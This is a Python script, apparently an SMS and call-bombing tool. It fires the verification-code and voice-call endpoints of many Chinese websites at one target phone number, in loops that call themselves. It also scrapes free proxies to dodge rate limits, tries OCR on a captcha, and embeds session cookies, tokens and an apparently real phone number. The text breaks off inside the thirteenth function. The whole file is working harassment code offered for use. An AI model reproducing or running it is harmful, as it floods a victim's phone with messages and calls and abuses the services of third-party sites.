#!/usr/bin/env python3
# -*- coding: utf-8 -*-
import requests
import time
import json
import threading
from PIL import Image
from PIL import ImageEnhance
import sys
import datetime
from io import BytesIO
import pytesseract
import os
from PIL import ImageFile
from bs4 import BeautifulSoup

#【自动获取代理】(https://www.xicidaili.com/api)
def getProxies():
    url='https://www.xicidaili.com/nn/'
    headers={
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',
        'Accept-Encoding': 'gzip, deflate, br',
        'Accept-Language': 'zh-CN,zh;q=0.9,en;q=0.8',
        'Cache-Control': 'max-age=0',
        'Connection': 'keep-alive',
        'Cookie': '_free_proxy_session=BAh7B0kiD3Nlc3Npb25faWQGOgZFVEkiJTk5OWIwYTEzNDcxMjVmNWY1ZmI2ZjhhMjE4ZjViMzJhBjsAVEkiEF9jc3JmX3Rva2VuBjsARkkiMWFMN1VzeEx3R1dUeklCWlNodmlkWVNyNFFyQjVRdVNXeXAreFl6OExVMms9BjsARg%3D%3D--2846b5bcb49b4709f559b35d5b98e29121bedd4d; Hm_lvt_0cf76c77469e965d2957f0553e6ecf59=1544409014,1544498519; Hm_lpvt_0cf76c77469e965d2957f0553e6ecf59=1544500144',
        'Host': 'www.xicidaili.com',
        'If-None-Match': 'W/"13f40a11d916a7b713fbd0f849ba47a2"',
        'Referer': 'https://www.xicidaili.com/api',
        'Upgrade-Insecure-Requests': '1',
        'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.77 Safari/537.36'
        }
    response = requests.get(url,headers=headers)
    content = response.text
    #print(content)
    soup = BeautifulSoup(content, 'html.parser')
    ip_list=soup.find('table',id='ip_list')
    ipList= ip_list.find_all('td')
    i=0;
    proxies={}
    while i<1000:
        ip=str(ipList[i+1]).replace('<td>','').replace('</td>','')
        proxy=str(ipList[i+2]).replace('<td>','').replace('</td>','')
        http=str(ipList[i+5]).replace('<td>','').replace('</td>','')
        i=i+10
        proxies[ip+':'+proxy]=http
    return proxies
        





#【每天上限3次】
def fun1(step,phone):#巨人网络@电话(https://reg.ztgame.com/)
    url='https://reg.ztgame.com/common/send-voice?source=&nonce=&type=verifycode&token=&refurl=&cururl=http%3A%2F%2Freg.ztgame.com%2F&phone='+phone+'&mpcode=&pwd=&tname=&idcard='
    headers={
    'Accept': 'application/json, text/javascript, */*; q=0.01',
    'Accept-Encoding': 'gzip, deflate, br',
    'Accept-Language': 'zh-CN,zh;q=0.9,en;q=0.8',
    'Connection': 'keep-alive',
    'Cookie': 'UM_distinctid=166a03bf79058f-00d45b1ffabb6-346a7808-fa000-166a03bf7912ea; AM_SESSID=3364tgi01dkvuk6mn5k2rh8q94; ucd=6264b0d1313159f664124880a07e223a77e144a71e6058b7376cd93998ee318ca%3A2%3A%7Bi%3A0%3Bs%3A3%3A%22ucd%22%3Bi%3A1%3Bs%3A26%3A%223364tgi01dkvuk6mn5k2rh8q94%22%3B%7D; NSC_sfh.auhbnf.dpn_uy_ttm=ffffffffaf14b54945525d5f4f58455e445a4a423660; CNZZDATA1262808196=1490832956-1540286306-https%253A%252F%252Fwww.baidu.com%252F%7C1540948764; NSC_sfh.auhbnf.dpn_bmj_ttm=ffffffffaf167b2545525d5f4f58455e445a4a423660',
    'Host': 'reg.ztgame.com',
    'Referer': 'https://reg.ztgame.com/',
    'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.67 Safari/537.36',
    'X-Requested-With': 'XMLHttpRequest'
    }
    response = requests.get(url, headers=headers)
    print('【fun1】')
    print(response.text)
    time.sleep(step)
    fun1(step,phone)

#【验证码】
def fun2(step,phone):#好大夫在线@短信(https://passport.haodf.com/user/showregisterbymobile)
    url='https://passport.haodf.com/user/ajaxsendmobilecode'
    headers={
    'Accept': '*/*',
    'Accept-Encoding': 'gzip, deflate, br',
    'Accept-Language': 'zh-CN,zh;q=0.9,en;q=0.8',
    'Connection': 'keep-alive',
    'Content-Length': '44',
    'Content-Type': 'application/x-www-form-urlencoded',
    'Cookie': 'g=HDF.34.5bd9112c52345; __jsluid=ea3deffb30107cad13bf3351534ba9ba; CNZZDATA-FE=CNZZDATA-FE; UM_distinctid=166c7eb19f31ba-053f511196d51b-1f3f6654-fa000-166c7eb19f41d2; CNZZDATA1915189=cnzz_eid%3D2053231178-1540950112-https%253A%252F%252Fwww.baidu.com%252F%26ntime%3D1540950112; _ga=GA1.2.6187305.1540952366; _gid=GA1.2.387776141.1540952366; _gat=1; Hm_lvt_dfa5478034171cc641b1639b2a5b717d=1540952366; Hm_lpvt_dfa5478034171cc641b1639b2a5b717d=1540952366',
    'Host': 'passport.haodf.com',
    'Origin': 'https://passport.haodf.com',
    'Referer': 'https://passport.haodf.com/user/showregisterbymobile',
    'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.67 Safari/537.36',
    'X-Requested-With': 'XMLHttpRequest'
    }
    data={
        'mobileNumber': phone,
        'sourceType': 'Register'
        }
    
    data={
        'mobileNumber': phone,
        'token': '',
        'verify': ''
        }
    response = requests.post(url,data=data, headers=headers)
    print('【fun2】')
    print(response.text)
    time.sleep(step)
    fun2(step,phone)

#【有效】        
def fun3(step,phone,proxies):#中洁网@短信(http://www.jieju.cn/MemberCenter/login/PhoneRegister.aspx)
    url='http://www.jieju.cn/MemberCenter/Login/PhoneRegister.aspx/SendCode'
    headers={
        'Accept': '*/*',
        'Accept-Encoding': 'gzip, deflate',
        'Accept-Language': 'zh-CN,zh;q=0.9,en;q=0.8',
        'Connection': 'keep-alive',
        'Content-Length': '65',
        'Content-Type': 'application/json',
        'Cookie': 'ASP.NET_SessionId=g5qduqcwnzail1bbjzukh3b0; ZJW_URL=; safedog-flow-item=8ACE5274B58A9E2CF8F78BF9D81D923B',
        'Host': 'www.jieju.cn',
        'Origin': 'http://www.jieju.cn',
        'Referer': 'http://www.jieju.cn/MemberCenter/login/PhoneRegister.aspx',
        'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.67 Safari/537.36',
        'X-Requested-With': 'XMLHttpRequest'
    }  
    data="{phone:'"+phone+"',appkey:'j1ejuD0tc0m',token:'taAX1L1az82n2z'}"
    response = requests.post(url,data=data, headers=headers,proxies = proxies)
    print('【fun3】')
    print(response.text)
    time.sleep(step)
    fun3(step,phone,proxies)

#【服务器故障】      
def fun4(step,phone):#集迈么@短信(http://www.jmall360.com/account/MobileRegister)
    url='http://www.jmall360.com/account/SendVerifyMobile?mobile='+phone
    headers={
        'Accept': '*/*',
        'Accept-Encoding': 'gzip, deflate',
        'Accept-Language': 'zh-CN,zh;q=0.9,en;q=0.8',
        'Connection': 'keep-alive',
        'Cookie': 'loc=ip=223.102.15.124&regionid=-1; bmasid=4357a63b81c7b1c2',
        'Host': 'www.jmall360.com',
        'Referer': 'http://www.jmall360.com/account/MobileRegister',
        'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.67 Safari/537.36',
        'X-Requested-With': 'XMLHttpRequest'
    }
    data={'mobile': phone}
    response = requests.get(url, headers=headers)
    print('【fun4】')
    #print(response.text)
    time.sleep(step)
    fun4(step,phone)

#【服务器故障】
def fun5(step,phone):#猎中猎@短信(http://www.lie2lie.com/Home/User/mobileProve)
    url='http://www.lie2lie.com/User/bandPhoneAddress'
    headers={
        'Accept': 'application/json, text/javascript, */*; q=0.01',
        'Accept-Encoding': 'gzip, deflate',
        'Accept-Language': 'zh-CN,zh;q=0.9,en;q=0.8',
        'Connection': 'keep-alive',
        'Content-Length': '41',
        'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
        'Cookie': 'PHPSESSID=3dhjhifrq3ltu0h8ttcg26vto5; Hm_lvt_003323ab6e458b6dd536687ea624f7ed=1540981367,1540981441; Hm_lpvt_003323ab6e458b6dd536687ea624f7ed=1540981458',
        'Host': 'www.lie2lie.com',
        'Origin': 'http://www.lie2lie.com',
        'Referer': 'http://www.lie2lie.com/Home/User/mobileProve',
        'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.67 Safari/537.36',
        'X-Requested-With': 'XMLHttpRequest'
    }
    data={
        'phoneValue': phone,
        'userIdvalue': '303947'
        }
    response = requests.post(url,data=data,headers=headers)
    print('【fun5】')
    print(response.text)
    time.sleep(step)
    fun5(step,phone)

#【封禁】
def fun6(step,phone):#易法通@短信(http://www.yifatong.com/Lawyers/register)
    url='http://www.yifatong.com/Customers/getsms?rnd=1540983590.219&mobile='+phone
    headers={
        'Accept': 'text/html, */*; q=0.01',
        'Accept-Encoding': 'gzip, deflate',
        'Accept-Language': 'zh-CN,zh;q=0.9,en;q=0.8',
        'Connection': 'keep-alive',
        'Cookie': "mediav=%7B%22eid%22%3A%22300890%22%2C%22ep%22%3A%22%22%2C%22vid%22%3A%22Eb3m%3A%2FTH'8%3AFOUn%5DPP%3F6%22%2C%22ctn%22%3A%22%22%7D; acw_tc=781bad3615409834497797472e36cb78a1ae6ddbe70300e752cc7f8143283d; CAKEPHP=1fef3660d752f51ee36966534dd4b146; Hm_lvt_fb384d34b375f9c11fc59bc51d22f5d4=1540983451; UM_distinctid=166c9c56db129c-0d73abd7bc5f89-1f3f6654-fa000-166c9c56db28cb; CNZZDATA1254492474=1420743099-1540982100-null%7C1540982100; Qs_lvt_104001=1540983451; LXB_REFER=www.baidu.com; IESESSION=alive; _qddaz=QD.4p70p9.258vmt.jnx1rd3i; _qdda=3-1.25f55i; _qddab=3-4xqntq.jnx1rd3l; pgv_pvi=4263954432; pgv_si=s4790711296; _qddamta_4008515666=3-0; Hm_lvt_9eef1197e697839acd67ee28766cd23d=1540983489; Hm_lpvt_9eef1197e697839acd67ee28766cd23d=1540983489; Hm_lpvt_fb384d34b375f9c11fc59bc51d22f5d4=1540983496; Qs_pv_104001=3289358293326345000%2C3350213143749152300%2C782697988354382000",
        'Host': 'www.yifatong.com',
        'Referer': 'http://www.yifatong.com/Lawyers/register',
        'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.67 Safari/537.36',
        'X-Requested-With': 'ZeroDivisionError'
    }
    response = requests.get(url,headers=headers)
    print('【fun6】')
    print(response.text)
    time.sleep(step)
    fun6(step,phone)

#【封禁】   
def fun7(step,phone):#江西新东方烹饪学校@电话(http://www.jxxdf.com/lxb.html)
        timeStamp =int(time.time()*1000)
        url='http://lxbjs.baidu.com/cb/call/getScode?uid=1042366&callback=_lxb_jsonp_'+str(timeStamp)+'_'
        headers={
            'Referer': 'http://www.jxxdf.com/lxb.html',
            'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.67 Safari/537.36'
        }
        response = requests.get(url,headers=headers)
        timeStamp =int(time.time()*1000)
        url='http://lxbjs.baidu.com/cb/user/check?uid=1042366&g=58161&t='+str(timeStamp)+'&f=4&r=https%3A%2F%2Fwww.baidu.com%2Flink%3Furl%3DuWR7_lUtm2WgDXxyvch5CqqOPJjtjTnTOyKe-HLo5W2soSGNoIpuM_QNvP_WBSBY%26wd%3D%26eqid%3Dcaf71ab100066e51000000035bd9941e&bdcbid=3e0ba4e4-19ca-4cee-9cdd-c06201b82ba3&callback=_lxb_jsonp_'+str(timeStamp)+'_'
        response = requests.get(url,headers=headers)
        response_text=response.text

        json_text=response_text.split('(')[1].replace(')','')
        json_data = json.loads(json_text)['data']
        json_tk = json_data['tk']
        timeStamp =int(time.time()*1000)
        url='http://lxbjs.baidu.com/cb/call?uid=1042366&g=58161&tk='+json_tk+'&vtel='+phone+'&bdcbid=3e0ba4e4-19ca-4cee-9cdd-c06201b82ba3&callback=_lxb_jsonp_'+str(timeStamp)+'_'
        response = requests.get(url,headers=headers)
        print('【fun7】')
        print(response.text)
        time.sleep(step)
        fun7(step,phone)

def fun8(step,phone):#列表网@短信(http://qiqihaer.liebiao.com/canyinjiameng/341530065.html)
        url='http://qiqihaer.liebiao.com/article/sendsms/'
        headers={
            'Accept': 'application/json, text/javascript, */*; q=0.01',
            'Accept-Encoding': 'gzip, deflate',
            'Accept-Language': 'zh-CN,zh;q=0.9,en;q=0.8',
            'Connection': 'keep-alive',
            'Content-Length': '17',
            'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
            'Cookie': '_uv_id=168538124673082642; acw_tc=3ccdc14615410754312957650e2763e851712f9a71564addf01619694f52d7; cities_last_visited=674; _sch_art=341530065; insert_cityandcate_record=674%2C2101; Hm_lvt_64399ff1f902e031cbd71ea81b89e520=1541075433; Hm_lvt_d1c8e5c1164dcc070ae572bcabfe773f=1539953918,1541075433; zsjm_visit_date=2018-11-1; Hm_lpvt_d1c8e5c1164dcc070ae572bcabfe773f=1541075487; Hm_lpvt_64399ff1f902e031cbd71ea81b89e520=1541075487',
            'Host': 'qiqihaer.liebiao.com',
            'Origin': 'http://qiqihaer.liebiao.com',
            'Referer': 'http://qiqihaer.liebiao.com/canyinjiameng/341530065.html',
            'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.67 Safari/537.36',
            'X-Requested-With': 'XMLHttpRequest'
            }
        data={
            'phone': phone
            }
        response = requests.post(url,data=data,headers=headers)
        print('【fun8】')
        print(response.text)
        time.sleep(step)
        fun8(step,phone)

def fun9(step,phone):#世纪佳缘网@短信(http://reg.jiayuan.com/signup/fillbasic.php?bd=210)
        url='http://reg.jiayuan.com/libs/xajax/reguser.server.php?processUserMobile'
        headers={
            'Accept': '*/*',
            'Accept-Encoding': 'gzip, deflate',
            'Accept-Language': 'zh-CN,zh;q=0.9,en;q=0.8',
            'Connection': 'keep-alive',
            'Content-Length': '146',
            'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
            'Cookie': 'SESSION_HASH=93fc3cacfd76d93302253f95b4f150c61d746a2f; user_access=1; PHPSESSID=03197f20376b5f90a66b5d2f474a38f8',
            'Host': 'reg.jiayuan.com',
            'Origin': 'http://reg.jiayuan.com',
            'Referer': 'http://reg.jiayuan.com/signup/fillbasic.php?bd=210',
            'sid': 'ad948d',
            'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.67 Safari/537.36',
            'X-Requested-With': 'XMLHttpRequest'
            }
        timeStamp =int(time.time()*1000)
        data={
            'xajax': 'processUserMobile',
            'xajaxargs[]': '<xjxquery><q>mobile='+phone+'&area_code=86</q></xjxquery>',
            'xajaxr': str(timeStamp)
            }
        response = requests.post(url,data=data,headers=headers)
        print(response.text)
        
        url='http://pv3.jyimg.com/any/h.gif?|get_vail_btn_v2|8207d8b1fee567888db5757e60612d413e971fd5|&i_tzuhqs=1544271863671|'
        heaaders={
            'Referer': 'http://reg.jiayuan.com/signup/fillbasic.php?bd=210',
            'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.77 Safari/537.36'
            }
        data={
            '|get_vail_btn_succ_v2|8207d8b1fee567888db5757e60612d413e971fd5|': '',
            'i_rxwe3v': str(timeStamp)+'|'
            }
        response = requests.get(url,data=data,headers=headers)
        print(response.text)
        url='http://pv4.jyimg.com/any/1.gif?|get_vail_btn_succ_v2|8207d8b1fee567888db5757e60612d413e971fd5|&i_rxwe3v=1544271863671|'
        heaaders={
            'Referer': 'http://reg.jiayuan.com/signup/fillbasic.php?bd=210',
            'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.77 Safari/537.36'
            }
        data={
            '|get_vail_btn_succ_v2|8207d8b1fee567888db5757e60612d413e971fd5|': '',
            'i_rxwe3v': str(timeStamp)+'|'
            }
        response = requests.get(url,data=data,headers=headers)
        print(response.text)
        
        headers={
            'Accept': '*/*',
            'Accept-Encoding': 'gzip, deflate',
            'Accept-Language': 'zh-CN,zh;q=0.9,en;q=0.8',
            'Connection': 'keep-alive',
            'Content-Length': '210',
            'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
            'Cookie': 'PHPSESSID=faeccc1c7fa546f5c6f0f3b9bdeae8b2; SESSION_HASH=8207d8b1fee567888db5757e60612d413e971fd5; user_access=1',
            'Host': 'reg.jiayuan.com',
            'Origin': 'http://reg.jiayuan.com',
            'Referer': 'http://reg.jiayuan.com/signup/fillbasic.php?bd=210',
            'sid': '808f80',
            'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.77 Safari/537.36',
            'X-Requested-With': 'XMLHttpRequest'
            }
        url='http://reg.jiayuan.com/libs/xajax/reguser.server.php?processSendOrUpdateMessage'
        data={
            'xajax': 'processSendOrUpdateMessage',
            'xajaxargs[]': '<xjxquery><q>mobile=9d364d3b28f088a62dccd82ff95a272c17740153798&area_code=86</q></xjxquery>',
            'xajaxargs[]': 'mobile',
            'xajaxr': str(timeStamp)
            }
        response = requests.post(url,data=data,headers=headers)
        print('【fun9】')
        print(response.text)
        time.sleep(step)
        fun9(step,phone)

#网页改版，功能取消
def fun10(step,phone):#云呼@电话(http://www.ucpaas.com/experience)
         url='http://www.ucpaas.com/checkcode/voiceExtCode'
         data={
             'phone': phone,
             'type': '2'
             }
         headers={
            'Accept': 'text/plain, */*; q=0.01',
            'Accept-Encoding': 'gzip, deflate',
            'Accept-Language': 'zh-CN,zh;q=0.9,en;q=0.8',
            'Connection': 'keep-alive',
            'Content-Length': '24',
            'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
            'Cookie':'create_url="http://www.ucpaas.com/?utm_source=baidu&utm_medium=cpc&utm_term=%E8%A1%8C%E4%B8%9A%E5%AE%9A%E6%8A%95&utm_content=&utm_campaign=%E7%AB%9E%E5%93%81%E7%9F%AD%E4%BF%A1&id=128692"; LXB_REFER=www.baidu.com; c__utma=821849481.95322109.948871748.1542671585.1542671585.1; c__utmc=821849481.95322109; IESESSION=alive; _qddaz=QD.hsqyi3.b9adzn.jooytxs6; pgv_pvi=3377652736; pgv_si=s9577188352; _qddamta_4007776698=3-0; tencentSig=1216253952; adv_url="https://www.baidu.com/baidu.php?url=0s0000KlmKuCTsdU2y-Qo4mkGIvevmPlZ_ucbX5XheMPg0ME9o75B6DgJUPPVFPmD4FRRzax4C3QN_YfNaF-MM2ob9xmy0VlXPmTFza5-UN1rEpJareZg3fDq6ZGUDGDoXzSqpoG9VXKGOpixmx_SPLen7qyc3WyQWKEfvpvwUWKEhXdS0.DY_jKjWuuWwKLsRP5QAeKPa-BqM76l32AM-YG8x6Y_f33X8a9G4pauVQAZ1vmxUg9vxj9tS1jlenrOv3x5I9qEM9LSLj4qrZueTrOIdsRP5Qal26h26kdsRP5Qa1Gk_Edwnmx5ksSLdseO5j4e_rOW9vN3x5kseOo9qEzsSxu9qxo9qVxyAWzk1ng_3_ZyAWzsYcVQAZ1vmxUg9vxj9tS1jlenrOv3x5I9qEM9LSLj4qrZueTrOId9BknN4PMHEzITDdZ-Cn1pbYZ4h2d2s1f_TIvl1mC0.U1Y10ZDqdnplq0Kspynqn0KY5IHA0A-V5HczPfKM5gK1IZc0Iybqmh7GuZR0TA-b5Hck0APGujYkPHR0UgfqnH0krNtknjDLg1csPWFxnH0vnNt1PW0k0AVG5H00TMfqPHm0uy-b5HDYPW9xnWTznHFxnWDknjIxnWTYnjKxnWTdnj60mhbqnW0Y0AdW5HDsnj7xrj0knHfdP1b1g1csP1f3PW0sn1uxnH0zg100TgKGujYs0Z7Wpyfqn0KzuLw9u1Ys0A7B5HKxn0K-ThTqn0KsTjYs0A4vTjYsQW0snj0snj0s0AdYTjYs0AwbUL0qn0KzpWYs0Aw-IWdsmsKhIjYs0ZKC5H00ULnqn0KBI1Ykn0K8IjYs0ZPl5fKYIgnqn1c3P1nYPHn4nHRsrj64rjb4P6Kzug7Y5HDdPjcvP1DYnjDkPjR0Tv-b5HbdryuWrHu-nj0snWPbnhm0mLPV5H6YrRf1PH9anjRdPWR1fH00mynqnfKYIgfqnfKsUWYs0Z7VIjYs0Z7VT1Ys0ZGY5H00UyPxuMFEUHYsg1Kxn7tsg100uA78IyF-gLK_my4GuZnqn7tsg1KxnWT4nWnvnNts0ZK9I7qhUA7M5H00uAPGujYs0ANYpyfqQHD0mgPsmvnqn0KdTA-8mvnqn0KkUymqnHm0uhPdIjYs0AulpjYs0Au9IjYs0ZGsUZN15H00mywhUA7M5H60UAuW5H00mLFW5Hnznjb1&ck=7022.9.5.353.368.313.143.2467&shh=www.baidu.com&ie=UTF-8&f=8&tn=baidu&wd=%E4%BA%91%E5%91%BC&rqlang=cn&bc=110101&us=3.304617.4.0.1.305.0.0"; Hm_lvt_086fa6bc6f48b55eb534c7f49010d8cd=1542671585,1542671889; _qdda=3-1.3dzmmh; _qddab=3-vtox5.jooz0g95; _ga=GA1.2.947309911.1542671892; _gid=GA1.2.2011693941.1542671892; Hm_lpvt_086fa6bc6f48b55eb534c7f49010d8cd=1542674762; JSESSIONID=1B7E9C1D03F5E4D29B4306E1699BFDCB.tomcat100',
            'Host': 'www.ucpaas.com',
            'Origin': 'http://www.ucpaas.com',
            'Referer': 'http://www.ucpaas.com/experience',
            'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.77 Safari/537.36',
            'X-Requested-With': 'XMLHttpRequest'
             }
         response = requests.post(url,data=data,headers=headers)
         print('【fun10】')
         print(response.text)    
         time.sleep(step)
         fun10(step,phone)
 
def fun11(step,phone):#新航通通信@电话(http://www.sip800.com/index/api.html)
        url='http://www.sip800.com/index/web_call_checkcode.html?t=1.0Mon%20Dec%2003%202018%2008:59:51%20GMT+0800%20(%E4%B8%AD%E5%9B%BD%E6%A0%87%E5%87%86%E6%97%B6%E9%97%B4)'
        nowTime=datetime.datetime.now().strftime('1.0Mon %b %d %Y %H:%M:%S GMT 0800 (中国标准时间)')
        print(nowTime)
        #os.makedirs('~/Desktop/DongFangMiao/image/0.png', exist_ok=True)
        data={
             't': nowTime
             }
        headers={
            'Accept': 'image/webp,image/apng,image/*,*/*;q=0.8',
            'Accept-Encoding': 'gzip, deflate',
            'Accept-Language': 'zh-CN,zh;q=0.9,en;q=0.8',
            'Connection': 'keep-alive',
            'Cookie': 'PHPSESSID=vdcq4q9c9q507sqs95hcbv6m11; __51cke__=; __tins__4157514=%7B%22sid%22%3A%201543798087954%2C%20%22vd%22%3A%203%2C%20%22expires%22%3A%201543800582498%7D; __51laig__=8',
            'Host': 'www.sip800.com',
            'Referer': 'http://www.sip800.com/index/web_call_window.html?from=http%3A%2F%2Fwww.sip800.com%2Findex%2Fweb_call_api%3Fkey%3D1%26token%3D68b98b81c9dbc4012170d4c575b9497ae3534d9c%26appid%3D8bb75744f6cafb15fb4b42b0db5280ea%26phone%3D&nickname=&key=1',
            'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.77 Safari/537.36'
            }
        #for i in range(100):
        response = requests.post(url,data=data,headers=headers)
        image = Image.open(BytesIO(response.content))
        image = Image.open('/Users/未命名文件夹/Desktop/DongFangMiao/image/q.png')
        image.show()
        '''
        gray=image.convert('L')
        gray.show()
        bw=gray.point(lambda x:0 if x<150 else 255,'1')
        bw.show()
        '''
        '''
            with open('~/image/'+str(i+172)+'.png', 'wb') as f:
                f.write(response.content)
            time.sleep(0.5)
        '''
        code = pytesseract.image_to_string(image,lang='eng')
        print(code)
        print('【fun11】')
        
        '''
        time.sleep(step)
        fun11(step,phone)
        '''
        
        
def fun12(step,phone,proxies):#声灵机器人@短信(http://www.shengxunrobot.com/sy?utm_source=baiduppc&utm_campaign=yingxiaoye)
        url='http://www.shengxunrobot.com/index/index/codes?phone=17740153798'
        data={
             'phone':phone
             }
        headers={
            'Accept': 'application/json, text/javascript, */*; q=0.01',
            'Accept-Encoding': 'gzip, deflate',
            'Accept-Language': 'zh-CN,zh;q=0.9,en;q=0.8',
            'Connection': 'keep-alive',
            'Cookie': "LXB_REFER=www.baidu.com; _ga=GA1.2.1715891313.1543631934; _gid=GA1.2.1632136566.1543631934; PHPSESSID=m2mjcl1q3e1pa49pomnp4gsjb6; Qs_lvt_213320=1543631933%2C1543632121; Qs_pv_213320=1823001462098545700%2C1777171126677172500%2C3171970976698452500; Hm_lvt_e3bfe1a62c7c6248c5b59113773dbb20=1543631933,1543632121; Hm_lpvt_e3bfe1a62c7c6248c5b59113773dbb20=1543632121; looyu_id=91f3c898e8bedc741e8f94104d577946_20003657%3A2; mediav=%7B%22eid%22%3A%22487968%22%2C%22ep%22%3A%22%22%2C%22vid%22%3A%22Eb3m%3A%2FTH'8%3AE%5D!f%60'%3D%40!%22%2C%22ctn%22%3A%22%22%7D; looyu_20003657=v%3A4c3ba956d3e840ec35d1d9c649dcc985%2Cref%3Ahttps%253A//www.baidu.com/baidu.php%253Fsc.K00000KbUiqGbb95aPfSZIZeYjgL_AFeGzLgippKeObiZxxzeJmIIhFP1j_3fssQF9u5qST0ckZTQnf7mNp7JKdNAD-KrRtE5mBtet6Z6XCIwAHSjYpP5hqLiETwKKpFu0vPqktZNsjqEpb8g1FhiCtFEp93m_ZZICXlSHufC7XQ6VO0mwRuQhQXpHLFF6iWzjdCpRTRAZtUVrCvms.DR_arGrUCswHrEIfwKZCe32AM-WI6h9ikX1BsmtT5gKfYt_QrMAzONDkCxhlZ_8YFRojPak8tIqxBC0.U1Yk0ZDqVXXe_QEm_Jm0TA-W5H00IjdLILT-nbRYuLI-py9dmiRzwyP80A-V5HczPfKM5yF-TZnk0ZNG5yF9pywd0ZKGujYznfKWpyfqnHRd0AdY5H6drH9xnH0krNtknjDLg1csPWFxn1msnfKopHYk0ZFY5HRv0ANGujYzP1bzrNtkPjm3g1cLnWDzg1cknH0Lg1cLPH030AFG5Hfsn-tznjf0Uynqn10snWRLPWm3P-tknj0kg16sPHTsrH6YrNtzrjbYn1cYrH04g100TgKGujYs0Z7Wpyfqn0KzuLw9u1Ys0A7B5HKxn0K-ThTqn0KsTjYs0A4vTjYsQW0snj0snj0s0AdYTjYs0AwbUL0qn0KzpWYs0Aw-IWdsmsKhIjYs0ZKC5H00ULnqn0KBI1Ykn0K8IjYs0ZPl5fKYIgnqnHTdrHRYPjmsn1Tvrj03P1fdnWm0ThNkIjYkPHf1PWnznHDkrHn10ZPGujY3PW7WrH63PW0snjKBn1040AP1UHY3Pj-Dn1R3fW0dPHmdnYDs0A7W5HD0IZNY5HD0TA3qn1D0TydY5H00Tyd15H00XMfqn0KVmdqhThqV5HKxn7tsg1Kxn0Kbmy4dmhNxTAk9Uh-bT1Ysg1Kxn7tsg100TA7Ygvu_myTqn0Kbmv-b5H00ugwGujYVnfK9TLKWm1Ys0ZNspy4Wm1Ys0Z7VuWYkP6KhmLNY5H00uMGC5H00uh7Y5H00XMK_Ignqn0K9uAu_myTqr0K_uhnqn0K3TLwd5HcYrjR1nWTv0APzm1YdrjD3r0%2526word%253D%2525E7%252594%2525B5%2525E8%2525AF%25259D%2525E5%25259B%25259E%2525E6%25258B%2525A8%2526ck%253D6764.4.6.410.215.439.229.433%2526shh%253Dwww.baidu.com%2526us%253D1.0.1.0.1.308.0%2526bc%253D110101%2Cr%3A%2Cmon%3Ahttps%3A//m9102.looyu.com/monitor%2Cp0%3Ahttp%253A//www.shengxunrobot.com/sy%253Futm_source%253Dbaiduppc%2526utm_campaign%253Dyingxiaoye",
            'Host': 'www.shengxunrobot.com',
            'Referer': 'http://www.shengxunrobot.com/sy?utm_source=baiduppc&utm_campaign=yingxiaoye',
            'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.77 Safari/537.36',
            'X-Requested-With': 'XMLHttpRequest'
            }
        response = requests.post(url,data=data,headers=headers,proxies=proxies)
        print('【fun12】')
        print(response.text)
        time.sleep(step)
        fun12(step,phone,proxies)

def fun13(step,phone,proxies):#金蝶云之家@短信(https://www.yunzhijia.com/home/expand?singleFeature=freeTalk&utm_source=baidu&utm_medium=b18071207067)
        url='https://www.yunzhijia.com/invite/c/phoneCode'
        data={
            'mobile': phone,
            'vcode':'', 
            'vcodeId': ''
             }
        headers={
            'authority': 'www.yunzhijia.com',
            'method': 'POST',
            'path': '/invite/c/phoneCode',
            'scheme': 'https',
            'accept': 'application/json, text/javascript, */*; q=0.01',
            'accept-encoding': 'gzip, deflate, br',
            'accept-language': 'zh-CN,zh;q=0.9,en;q=0.8',
            'content-length': '34',
            'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
